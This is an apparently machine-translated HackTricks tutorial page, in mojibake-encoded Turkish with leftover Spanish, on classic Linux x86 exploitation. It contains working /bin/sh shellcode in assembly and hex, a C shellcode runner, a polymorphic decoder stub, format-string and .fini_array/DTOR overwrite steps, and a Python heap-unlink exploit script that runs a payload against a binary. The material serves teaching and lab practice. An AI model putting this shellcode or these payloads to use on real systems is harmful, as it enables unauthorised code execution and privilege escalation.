# Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile</strong>!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na bakÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**]'ni alÄ±n (https://peass.creator-spring.com)
* [**The PEASS Family**]'yi keÅŸfedin (https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**]'den oluÅŸan koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## **2.SHELLCODE**

Kernel kesmelerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'Ä± temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Sistem Ã§aÄŸrÄ±sÄ±nÄ± yÃ¼rÃ¼t

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kod iÃ§eren yÃ¼rÃ¼tÃ¼lebilir bir dosya verir ve **objdump** ile opcode'larÄ± Ã§Ä±karabiliriz\
**objdump -d -Mintel ./shellcodeout** â€”> GerÃ§ekten shellcodemuz olduÄŸunu ve opcode'larÄ± Ã§Ä±karmak iÃ§in

**Shellcodenin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol etmek**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Sistem Ã§aÄŸrÄ±larÄ±nÄ±n doÄŸru yapÄ±ldÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in Ã¶nceki program derlenmeli ve sistem Ã§aÄŸrÄ±larÄ± **strace ./DERLENMÄ°Å_PROGRAM** iÃ§inde gÃ¶rÃ¼nmelidir.

Shellcode'lar oluÅŸturulurken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir sÄ±Ã§rama yapmaktÄ±r. Ã‡aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve aynÄ± zamanda EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Ã‡aÄŸrÄ± talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi eklemiÅŸizdir, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve aynÄ± zamanda kodu devam ettirebiliriz.

Ã–RNEK **HÄ°LE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Yumurta AvcÄ±sÄ±:**

Bir iÅŸleme iliÅŸkilendirilmiÅŸ bellek sayfalarÄ±nÄ± dolaÅŸarak orada saklanan shellcode'u arayan kÃ¼Ã§Ã¼k bir kod parÃ§asÄ±dÄ±r (shellcode'da yer alan bir imza arar). Kod enjekte etmek iÃ§in sadece kÃ¼Ã§Ã¼k bir alanÄ±n olduÄŸu durumlarda faydalÄ±dÄ±r.

**Polimorfik Shellcode'lar**

KÃ¼Ã§Ã¼k kodlarla ÅŸifrelenmiÅŸ kabuklardÄ±r ve bunlarÄ± Ã§Ã¶zen ve onlara atlayan kÃ¼Ã§Ã¼k kodlar iÃ§erirler, Call-Pop hilesini kullanarak ÅŸifrelenmiÅŸ bir Ã¶rnek ÅŸÃ¶yle olabilir:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```
## **5. Ek yÃ¶ntemler**

**Ret2Ret**

EIP'ye bir adres yerleÅŸtirilemediÄŸinde (EIP'nin 0xbf iÃ§ermediÄŸi kontrol edilir) veya shellcode'un konumu hesaplanamadÄ±ÄŸÄ±nda faydalÄ±dÄ±r. Ancak, zafiyetli fonksiyon bir parametre kabul eder (shellcode buraya gidecektir).

Bu ÅŸekilde, EIP'yi bir **ret** adresine deÄŸiÅŸtirerek, bir sonraki adres yÃ¼klenecektir (bu, fonksiyonun ilk argÃ¼manÄ±nÄ±n adresidir). Yani, shellcode yÃ¼klenecektir.

SaldÄ±rÄ±: SHELLCODE + Dolgu (EIP'ye kadar) + **\&ret** (yÄ±ÄŸÄ±nÄ±n sonraki baytlarÄ±, geÃ§irilen parametre adresine iÅŸaret ettiÄŸi iÃ§in shellcode'un baÅŸlangÄ±cÄ±na iÅŸaret eder)

**strncpy** gibi iÅŸlevler, tamamlandÄ±ÄŸÄ±nda shellcode'un saklandÄ±ÄŸÄ± adresi yÄ±ÄŸÄ±ndan kaldÄ±rÄ±r, bu da bu tekniÄŸi imkansÄ±z kÄ±lar gibi gÃ¶rÃ¼nmektedir. Yani, iÅŸlev iÃ§in argÃ¼man olarak geÃ§irilen adres (shellcode'u saklayan adres) 0x00 ile deÄŸiÅŸtirilir, bu nedenle ikinci **ret** Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda 0x00 ile karÅŸÄ±laÅŸÄ±lÄ±r ve program Ã§Ã¶ker.

**Murat TekniÄŸi**

Linux'ta tÃ¼m programlar 0xbfffffff'den baÅŸlayarak eÅŸlenir.

Linux'ta yeni bir iÅŸlem yÄ±ÄŸÄ±nÄ± nasÄ±l oluÅŸturulduÄŸunu gÃ¶z Ã¶nÃ¼nde bulundurarak, bir programÄ±n yalnÄ±zca shellcode'un bulunduÄŸu bir ortamda baÅŸlatÄ±lmasÄ±nÄ± saÄŸlayacak bir saldÄ±rÄ± geliÅŸtirilebilir. Bu durumda, bu deÄŸiÅŸkenin adresi ÅŸu ÅŸekilde hesaplanabilir: addr = 0xbfffffff - 4 - strlen(FULL_EXECUTABLE_NAME) - strlen(shellcode)

Bu ÅŸekilde, shellcode'un bulunduÄŸu ortam deÄŸiÅŸkeninin adresi kolayca elde edilir.

Bu, execle fonksiyonunun istenilen sadece Ã§evresel deÄŸiÅŸkenlere sahip bir ortam oluÅŸturmasÄ±na izin vermesi sayesinde yapÄ±labilir.

**TamsayÄ± taÅŸmalarÄ±**

Bu tÃ¼r taÅŸmalar, bir deÄŸiÅŸkenin geÃ§irilen kadar bÃ¼yÃ¼k bir sayÄ±yÄ± desteklemeye hazÄ±r olmadÄ±ÄŸÄ±nda meydana gelir, muhtemelen iÅŸaretli ve iÅŸaretsiz deÄŸiÅŸkenler arasÄ±ndaki karÄ±ÅŸÄ±klÄ±ktan kaynaklanabilir, Ã¶rneÄŸin:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Ã–nceki Ã¶rnekte programÄ±n 2 parametre beklediÄŸini gÃ¶rÃ¼yoruz. Ä°lk parametre takip eden dizenin uzunluÄŸu ve ikinci parametre dizedir.

EÄŸer ilk parametre olarak negatif bir sayÄ± verirsek len < 256 Ã§Ä±kacaktÄ±r ve bu filtreyi geÃ§eceÄŸiz, ayrÄ±ca strlen(buffer) da l'den daha kÃ¼Ã§Ã¼k olacaktÄ±r, Ã§Ã¼nkÃ¼ l unsigned int'tir ve Ã§ok bÃ¼yÃ¼k olacaktÄ±r.

Bu tÃ¼r taÅŸmalarda amaÃ§, programÄ±n iÅŸlemine bir ÅŸeyler yazmak deÄŸil, kÃ¶tÃ¼ tasarlanmÄ±ÅŸ filtreleri aÅŸarak diÄŸer zafiyetleri sÃ¶mÃ¼rmektir.

**BaÅŸlatÄ±lmamÄ±ÅŸ DeÄŸiÅŸkenler**

BaÅŸlatÄ±lmamÄ±ÅŸ bir deÄŸiÅŸkenin alabileceÄŸi deÄŸer bilinmez ve bunu gÃ¶zlemlemek ilginÃ§ olabilir. Ã–nceki iÅŸlevdeki bir deÄŸiÅŸkenin aldÄ±ÄŸÄ± deÄŸeri alabilir ve bu deÄŸiÅŸken saldÄ±rgan tarafÄ±ndan kontrol edilebilir.

##

###

###

###

### **.fini\_array**

Temelde, bu programÄ±n bitmeden Ã¶nce Ã§aÄŸrÄ±lacak iÅŸlevlerin bulunduÄŸu bir yapÄ±dÄ±r. Bu, **shellcode'unuza bir adrese atlayarak Ã§aÄŸÄ±rabiliyorsanÄ±z** veya format dizesini ikinci kez sÃ¶mÃ¼rmek iÃ§in tekrar main'e **dÃ¶nmek zorunda kaldÄ±ÄŸÄ±nÄ±z durumlarda** ilginÃ§tir.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Bu, **sonsuz bir dÃ¶ngÃ¼ oluÅŸturmayacak** Ã§Ã¼nkÃ¼ ana programa geri dÃ¶ndÃ¼ÄŸÃ¼nÃ¼zde canary fark edecek, yÄ±ÄŸÄ±nÄ±n sonu bozulabilir ve iÅŸlev tekrar Ã§aÄŸrÄ±lmayacak. Bu sayede **zafiyetin 1 kez daha yÃ¼rÃ¼tÃ¼lmesini** saÄŸlayabileceksiniz.

### **Ä°Ã§eriÄŸi DÃ¶kmek Ä°Ã§in Format Dizileri**

Bir format dizesi, programÄ±n belleÄŸinden iÃ§erik **dÃ¶kmek** iÃ§in de kÃ¶tÃ¼ye kullanÄ±labilir.\
Ã–rneÄŸin, aÅŸaÄŸÄ±daki durumda, yÄ±ÄŸÄ±nda bir bayraÄŸa iÅŸaret eden bir **yerel deÄŸiÅŸken** var. EÄŸer **bellekte bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin nerede olduÄŸunu bulursanÄ±z**, **printf'in** o **adrese eriÅŸmesini** saÄŸlayabilir ve **bayraÄŸÄ± yazdÄ±rabilirsiniz**:

Yani, bayrak **0xffffcf4c** adresinde

![](<../../.gitbook/assets/image (618) (2).png>)

Ve sÄ±zÄ±ntÄ±dan **bayraÄŸa iÅŸaret eden iÅŸaretÃ§inin** **8.** parametrede olduÄŸunu gÃ¶rebilirsiniz:

![](<../../.gitbook/assets/image (623).png>)

Bu nedenle, **8. parametreye eriÅŸerek** bayraÄŸÄ± alabilirsiniz:

![](<../../.gitbook/assets/image (624).png>)

**Ã–nceki zafiyeti** takip ederek ve **iÃ§erik sÄ±zdÄ±rabileceÄŸinizi** fark ederek, **`printf`**'e **iÅŸaretÃ§ileri ayarlayabilir** ve **yÃ¼rÃ¼tÃ¼lebilir** olan bÃ¶lÃ¼me **eriÅŸebilir** ve onu **tamamen dÃ¶kÃ¼lebilirsiniz**!

### **DTOR**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bir dtor bÃ¶lÃ¼mÃ¼ olan bir ikili dosya bulmak Ã§ok **garip**.
{% endhint %}

YÄ±kÄ±cÄ±lar, programÄ±n **sonlandÄ±ÄŸÄ±ndan Ã¶nce yÃ¼rÃ¼tÃ¼len iÅŸlevlerdir**.\
Bir **adresi** **`__DTOR_END__`**'e yazmayÄ± baÅŸarÄ±rsanÄ±z, bu, programÄ±n sona ermeden Ã¶nce **yÃ¼rÃ¼tÃ¼lecektir**.\
Bu bÃ¶lÃ¼mÃ¼n adresini ÅŸu ÅŸekilde alÄ±n:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```
Genellikle **DTOR** bÃ¶lÃ¼mÃ¼nÃ¼ `ffffffff` ve `00000000` deÄŸerleri **arasÄ±nda** bulacaksÄ±nÄ±z. Bu yÃ¼zden sadece bu deÄŸerleri gÃ¶rÃ¼yorsanÄ±z, bu, **herhangi bir iÅŸlevin kayÄ±tlÄ± olmadÄ±ÄŸÄ± anlamÄ±na gelir**. Bu yÃ¼zden **`00000000`**'Ä± **Ã¼zerine yazarak** shellcode'Ä± **Ã§alÄ±ÅŸtÄ±rmak iÃ§in adresi** yazÄ±n.

### **Format Dizileri ile Tampon TaÅŸmalarÄ±**

**sprintf**, biÃ§imlendirilmiÅŸ bir dizesi **bir deÄŸiÅŸkene taÅŸÄ±r**. Bu nedenle, bir dizenin biÃ§imlendirmesini **kullanarak**, iÃ§eriÄŸin kopyalandÄ±ÄŸÄ± deÄŸiÅŸkende bir **tampon taÅŸmasÄ±na neden olabilirsiniz**.\
Ã–rneÄŸin, yÃ¼k `%.44xAAAA` deÄŸiÅŸkene **44B+"AAAA" yazacaktÄ±r**, bu da bir tampon taÅŸmasÄ±na neden olabilir.

### **\_\_atexit YapÄ±larÄ±**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`atexit()`**, **parametre olarak baÅŸka iÅŸlevlerin** geÃ§irildiÄŸi bir iÅŸlevdir. Bu **iÅŸlevler**, bir **`exit()`** veya **main**'in **dÃ¶nÃ¼ÅŸÃ¼** sÄ±rasÄ±nda **Ã§alÄ±ÅŸtÄ±rÄ±lacaktÄ±r**.\
Ã–rneÄŸin, bu iÅŸlevlerden herhangi birinin adresini Ã¶rneÄŸin bir shellcode'a yÃ¶nlendirebilirseniz, **iÅŸlemi kontrol edebilirsiniz**, ancak bu ÅŸu anda daha karmaÅŸÄ±ktÄ±r.\
Åu anda **Ã§alÄ±ÅŸtÄ±rÄ±lacak iÅŸlevlerin adresleri** birkaÃ§ yapÄ± arkasÄ±nda gizlenmiÅŸtir ve sonunda iÅŸlevlerin adresleri deÄŸil, **XOR ile ÅŸifrelenmiÅŸ ve rastgele bir anahtarla kaydÄ±rÄ±lmÄ±ÅŸtÄ±r**. Bu nedenle, bu saldÄ±rÄ± vektÃ¶rÃ¼ ÅŸu anda **en azÄ±ndan x86** ve **x64\_86** Ã¼zerinde Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.\
**Åifreleme iÅŸlevi** **`PTR_MANGLE`**'dÄ±r. m68k, mips32, mips64, aarch64, arm, hppa gibi **diÄŸer mimariler**, girdi olarak aldÄ±ÄŸÄ± gibi **ÅŸifreleme iÅŸlevini uygulamaz**. Bu nedenle, bu mimariler bu vektÃ¶r tarafÄ±ndan saldÄ±rÄ±ya uÄŸrayabilir.

### **setjmp() & longjmp()**

{% hint style="danger" %}
GÃ¼nÃ¼mÃ¼zde bunu **saldÄ±rmak Ã§ok garip**.
{% endhint %}

**`Setjmp()`**, **baÄŸlamÄ±** (kayÄ±tlarÄ±) **kaydetmeye izin verir**\
**`longjmp()`**, **baÄŸlamÄ± geri yÃ¼klemeye izin verir**.\
**Kaydedilen kayÄ±tlar**: `EBX, ESI, EDI, ESP, EIP, EBP`\
Olan ÅŸudur ki EIP ve ESP **`PTR_MANGLE`** iÅŸlevi tarafÄ±ndan geÃ§irilir, bu nedenle **bu saldÄ±rÄ±ya duyarlÄ± mimariler yukarÄ±dakiyle aynÄ±dÄ±r**.\
Hata kurtarma veya kesmeler iÃ§in kullanÄ±ÅŸlÄ±dÄ±r.\
Ancak okuduÄŸum kadarÄ±yla, diÄŸer kayÄ±tlarÄ±n korunmadÄ±ÄŸÄ±, bu nedenle bir iÅŸlevin iÃ§inde `call ebx`, `call esi` veya `call edi` varsa kontrol alÄ±nabilir. Veya EBP deÄŸiÅŸtirilerek ESP deÄŸiÅŸtirilebilir.

**VTable ve VPTR in C++**

Her sÄ±nÄ±fÄ±n bir **Vtable**'Ä± vardÄ±r, bu bir **yÃ¶ntemler dizisidir**.

Her bir **sÄ±nÄ±fÄ±n nesnesi**, sÄ±nÄ±fÄ±nÄ±n bir **dizisine iÅŸaret eden** bir **VPtr**'ye sahiptir. VPtr, her nesnenin baÅŸlÄ±ÄŸÄ±nÄ±n bir parÃ§asÄ±dÄ±r, bu nedenle **VPtr'nin Ã¼zerine yazÄ±lmasÄ± baÅŸarÄ±lÄ± olursa**, bir iÅŸlevi Ã§alÄ±ÅŸtÄ±rmak iÃ§in sahte bir yÃ¶nteme iÅŸaret edebilir.

## **Ã–nleyici ve KaÃ§Ä±nma Ã–nlemleri**

###

**Libsafe DeÄŸiÅŸtirme**

Åununla etkinleÅŸtirilir: LD\_PRELOAD=/lib/libsafe.so.2\
veya\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

BazÄ± gÃ¼vensiz iÅŸlev Ã§aÄŸrÄ±larÄ±nÄ± gÃ¼venli iÅŸlevlerle deÄŸiÅŸtirir. Standart deÄŸildir. (yalnÄ±zca x86 iÃ§in, -fomit-frame-pointer ile derlenmemiÅŸ, statik derlemeler iÃ§in geÃ§erli deÄŸil, tÃ¼m savunmasÄ±z iÅŸlevler gÃ¼venli hale gelmez ve LD\_PRELOAD, setuid ile Ã§alÄ±ÅŸan ikili dosyalarda Ã§alÄ±ÅŸmaz).

**ASCII ZÄ±rhlÄ± Adres AlanÄ±**

PaylaÅŸÄ±lan kÃ¼tÃ¼phaneleri 0x00000000 ile 0x00ffffff arasÄ±nda yÃ¼klemek, her zaman bir 0x00 baytÄ±nÄ±n olmasÄ±nÄ± saÄŸlar. Bununla birlikte, bu neredeyse hiÃ§bir saldÄ±rÄ±yÄ± durdurmaz, Ã¶zellikle little endian'da.

**ret2plt**

strcpy@plt iÅŸlevini (plt'den) Ã§aÄŸÄ±rmak ve GOT girdisinin baÅŸÄ±na iÅŸlemek ve Ã§aÄŸrÄ±lmak istenen iÅŸlevin (system()) ilk baytÄ±nÄ± kopyalamak iÃ§in bir ROP gerÃ§ekleÅŸtirmek anlamÄ±na gelir. ArdÄ±ndan aynÄ±sÄ±nÄ± GOT+1'e iÅŸaret ederek system()'Ä±n 2. baytÄ±nÄ± kopyalarsÄ±nÄ±z... Sonunda GOT'da saklanan adres Ã§aÄŸrÄ±lÄ±r ve bu system() olacaktÄ±r.

**chroot() ile Kafesler**

debootstrap -arch=i386 hardy /home/user â€”> Belirli bir alt dizin altÄ±na temel bir sistem yÃ¼kler

Bir yÃ¶netici, bu kafeslerden birinden Ã§Ä±kmak iÃ§in ÅŸunu yapabilir: mkdir foo; chroot foo; cd ..

**Kod EnstrÃ¼mantasyonu**

Valgrind â€”> HatalarÄ± arar\
Memcheck\
RAD (Return Address Defender)\
Insure++
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<Iâ€, 0xfffffff0) #Ã–nceki parÃ§anÄ±n boÅŸ olduÄŸunu gÃ¶steren bitin 1 olduÄŸu Ã¶nemlidir**

**fake\_size = pack("\<Iâ€, 0xfffffffc) #-4, 3. parÃ§anÄ±n "size" alanÄ±nÄ±n 4 byte geride olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in (prev\_size'ye iÅŸaret eder)**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Payload'da baÅŸta 8 byte dolgu olacak ÅŸekilde**

**got\_free = pack("\<I", 0x08048300 - 12) #free() fonksiyonunun adresi plt-12 (free ikinci kez Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda shellcode'un Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ± adresi Ã¼zerine yazacak)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Payload, 8 byte dolgu ile baÅŸlar**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2. parÃ§a deÄŸiÅŸtirilir, got\_free, addr\_sc adresini saklayacaÄŸÄ± yere iÅŸaret eder + 12**

**os.system("./8.3.o " + payload)**

**unset() ters sÄ±rayla serbest bÄ±rakma (wargame)**

ÃœÃ§ ardÄ±ÅŸÄ±k parÃ§ayÄ± kontrol ediyoruz ve sÄ±rasÄ±yla serbest bÄ±rakÄ±lÄ±yorlar.

Bu durumda:

C parÃ§asÄ±na shellcode yerleÅŸtirilir

A parÃ§asÄ±nÄ±, A parÃ§asÄ±nÄ±n boÅŸ olduÄŸunu dÃ¼ÅŸÃ¼nmesi iÃ§in size alanÄ±ndaki PREV\_INUSE bitini devre dÄ±ÅŸÄ± bÄ±rakacak ÅŸekilde B'yi Ã¼zerine yazmak iÃ§in kullanÄ±rÄ±z.

AyrÄ±ca, baÅŸlÄ±k B'deki size alanÄ±nÄ± -4 olarak ayarlarÄ±z.

Bu durumda, program "a"nÄ±n boÅŸ olduÄŸunu ve bir binde olduÄŸunu dÃ¼ÅŸÃ¼necek ve onu Ã§Ã¶zmek iÃ§in unlink() fonksiyonunu Ã§aÄŸÄ±racaktÄ±r. Ancak, Ã§Ã¼nkÃ¼ baÅŸlÄ±k PREV\_SIZE -4 olarak ayarlanmÄ±ÅŸtÄ±r, program "a" parÃ§asÄ±nÄ±n aslÄ±nda B+4'te baÅŸladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼necektir. Yani, B+4'te "fd" iÅŸaretÃ§isi ve B+16'da "bk" iÅŸaretÃ§isi olacaktÄ±r.

Bu ÅŸekilde, bk'ye shellcode'un adresini ve fd'ye "puts()" fonksiyonunun adresini -12 olarak yerleÅŸtirirsek, payloadumuzu elde ederiz.

**Frontlink TekniÄŸi**

Bir ÅŸey serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda ve yanÄ±ndaki parÃ§alar boÅŸ deÄŸilse, unlink() fonksiyonu Ã§aÄŸrÄ±lmaz, doÄŸrudan frontlink() fonksiyonu Ã§aÄŸrÄ±lÄ±r.

SaldÄ±rÄ± yapÄ±lan malloc hiÃ§bir zaman serbest bÄ±rakÄ±lmazsa yararlÄ± bir zayÄ±flÄ±ktÄ±r.

Gereksinimler:

Veri giriÅŸi iÅŸleviyle taÅŸma olabilecek bir tampon

Bu tampona bitiÅŸik serbest bÄ±rakÄ±lacak ve baÅŸlÄ±k alanÄ±nÄ±n fd alanÄ± taÅŸma nedeniyle deÄŸiÅŸtirilecek bir tampon

512'den bÃ¼yÃ¼k ancak Ã¶nceki tampona gÃ¶re kÃ¼Ã§Ã¼k bir boyutta serbest bÄ±rakÄ±lacak bir tampon

Bu adÄ±mdan Ã¶nce bu tamponun prev\_size alanÄ±nÄ± Ã¼zerine yazabileceÄŸiniz bir tampon

Bu ÅŸekilde, kontrolsÃ¼z iki malloc Ã¼zerine yazarak ve sadece biri serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda bir saldÄ±rÄ± gerÃ§ekleÅŸtirebiliriz.

**Ã‡ift serbest bÄ±rakma Zafiyeti**

AynÄ± iÅŸaretÃ§iyle iki kez free() Ã§aÄŸrÄ±lÄ±rsa, iki adresi iÅŸaret eden iki bin oluÅŸur.

Birini tekrar kullanmak istendiÄŸinde sorunsuzca atanÄ±r. DiÄŸerini kullanmak istendiÄŸinde, Ã¶nceki rezervasyonun yazacaÄŸÄ± verilerle "fd" ve "bk" iÅŸaretÃ§ileri yanÄ±ltÄ±lÄ±r.

**Free() SonrasÄ±**

Ã–nceden serbest bÄ±rakÄ±lan bir iÅŸaretÃ§i kontrolsÃ¼z bir ÅŸekilde tekrar kullanÄ±lÄ±r.

## **8 Heap TaÅŸmalarÄ±: GeliÅŸmiÅŸ SaldÄ±rÄ±lar**

Unlink() ve FrontLink() teknikleri unlink() fonksiyonu deÄŸiÅŸtirilerek kaldÄ±rÄ±ldÄ±.

**The house of mind**

Kodun keyfi olarak yÃ¼rÃ¼tÃ¼lmesi iÃ§in sadece bir free() Ã§aÄŸrÄ±sÄ± gereklidir. TaÅŸan bir Ã¶nceki tampon tarafÄ±ndan serbest bÄ±rakÄ±lacak ve Ã¼zerine yazÄ±lacak ikinci bir tampon aranÄ±r.

Bir free() Ã§aÄŸrÄ±sÄ±, public\_fREe(mem) fonksiyonunu Ã§aÄŸÄ±rÄ±r, bu iÅŸlemi yapar:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mes); â€”> Bir parÃ§anÄ±n baÅŸladÄ±ÄŸÄ± adresi (mem-8) dÃ¶ndÃ¼rÃ¼r

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1] kÄ±smÄ±nda NON\_MAIN\_ARENA bitini kontrol eder, bu biti true dÃ¶ndÃ¼rmek iÃ§in deÄŸiÅŸtirilebilir ve heap\_for\_ptr() fonksiyonunu Ã§alÄ±ÅŸtÄ±rÄ±r, bu da "mem" Ã¼zerinde bir and iÅŸlemi yaparak en az anlamlÄ± 2.5 byte'Ä± sÄ±fÄ±rlar (Ã¶rneÄŸin 0x0804a000 adresinde 0x08000000 yapar) ve 0x08000000->ar\_ptr adresine eriÅŸir (struct heap\_info gibi).

Bu ÅŸekilde, Ã¶rneÄŸin 0x0804a000 adresinde bir parÃ§ayÄ± kontrol edebilir ve **0x081002a0** adresinde bir parÃ§anÄ±n serbest bÄ±rakÄ±lacaÄŸÄ±nÄ± varsayarsak, 0x08100000 adresine ulaÅŸabilir ve istediÄŸimiz ÅŸeyi yazabiliriz, Ã¶rneÄŸin **0x0804a000**. Bu ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda, heap\_for\_ptr(ptr)->ar\_ptr'yi 0x08100000 adresinde yazdÄ±ÄŸÄ±mÄ±zÄ± gÃ¶recektir (Ã§Ã¼nkÃ¼ Ã¶nce 0x081002a0 adresine and uygulanÄ±r ve buradan ilk 4 byte'Ä±n deÄŸeri alÄ±nÄ±r, yani ar\_ptr).

BÃ¶ylece, \_int\_free(ar\_ptr, mem) Ã§aÄŸrÄ±lÄ±r, yani **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

